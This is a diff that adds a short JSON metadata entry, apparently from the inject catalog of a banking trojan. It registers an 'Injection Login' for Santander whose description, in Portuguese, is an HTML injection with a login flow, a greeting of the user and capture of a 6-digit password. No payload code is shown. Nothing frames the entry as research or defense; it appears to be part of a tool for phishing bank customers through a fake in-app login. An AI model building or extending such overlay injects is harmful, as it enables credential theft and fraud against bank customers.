@@ -1,0 +1,7 @@
+{
+  "id": "Santander",
+  "name": "Injection Login",
+  "bank": "Santander",
+  "description": "Injection HTML com fluxo de login, saudação do usuário e captura de senha de 6 dígitos.",
+  "tags": ["login", "webview", "santander", "pin"]
+}
